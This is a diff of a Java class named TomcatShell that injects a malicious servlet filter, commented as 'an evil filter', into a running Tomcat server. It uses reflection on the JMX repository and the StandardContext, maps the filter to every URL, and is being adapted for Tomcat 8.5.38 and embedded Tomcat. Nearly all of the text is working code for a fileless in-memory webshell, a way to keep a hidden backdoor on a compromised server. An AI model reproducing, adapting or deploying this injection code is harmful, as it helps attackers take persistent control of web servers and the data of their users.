@@ -29,7 +29,7 @@ public class TomcatShell {
         }
     }
 
-    // work on tomcat8
+    // work on Tomcat/8.5.38
     private void exec() throws Exception {
         String filterName = "dynamicFilter";
 
@@ -43,7 +43,7 @@ public class TomcatShell {
         field.setAccessible(true);
         Repository repository  = (Repository) field.get(obj);
 
-        Set<NamedObject> objects =  repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
+        Set<NamedObject> objects =  repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
         for (NamedObject namedObj : objects) {
             try {
                 DynamicMBean dynamicMBean = namedObj.getObject();
@@ -55,21 +55,18 @@ public class TomcatShell {
                 field.setAccessible(true);
                 StandardContext context = (StandardContext) field.get(obj);
 
-                field = context.getClass().getDeclaredField("filterConfigs");
+                // 为什么这里 context 还是 TomcatEmbeddedContext 类型
+                field = context.getClass().getSuperclass().getDeclaredField("filterConfigs");
                 field.setAccessible(true);
                 HashMap<String, ApplicationFilterConfig> configs = (HashMap<String, ApplicationFilterConfig>) field.get(context);
 
                 if (configs.get(filterName) == null) {
                     // register an evil filter
                     Class<?> filterDefClass;
-                    try {
-                        filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
-                    } catch (ClassNotFoundException e) {
-                        filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
-                    }
+                    filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
 
                     Object filterDef = filterDefClass.newInstance();
-                    filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, filterName);
+                    filterDefClass.getDeclaredMethod("setFilterName", String.class).invoke(filterDef, filterName);
 
                     ClassLoader cl = Thread.currentThread().getContextClassLoader();
                     Class<?> clazz;
@@ -95,20 +92,16 @@ public class TomcatShell {
 
                     filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, clazz.getName());
                     filterDef.getClass().getDeclaredMethod("setFilter", Filter.class).invoke(filterDef, clazz.newInstance());
-                    context.getClass().getDeclaredMethod("addFilterDef", filterDefClass).invoke(context, filterDef);
+                    context.getClass().getSuperclass().getDeclaredMethod("addFilterDef", filterDefClass).invoke(context, filterDef);
 
                     Class<?> filterMapClass;
-                    try {
-                        filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
-                    } catch (ClassNotFoundException e) {
-                        filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
-                    }
+                    filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
 
                     Object filterMap = filterMapClass.newInstance();
                     filterMapClass.getDeclaredMethod("setFilterName", String.class).invoke(filterMap, filterName);
                     filterMapClass.getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, DispatcherType.REQUEST.name());
                     filterMapClass.getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, "/*");
-                    context.getClass().getDeclaredMethod("addFilterMapBefore", filterMapClass).invoke(context, filterMap);
+                    context.getClass().getSuperclass().getDeclaredMethod("addFilterMapBefore", filterMapClass).invoke(context, filterMap);
 
                     Constructor<ApplicationFilterConfig> constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                     constructor.setAccessible(true);
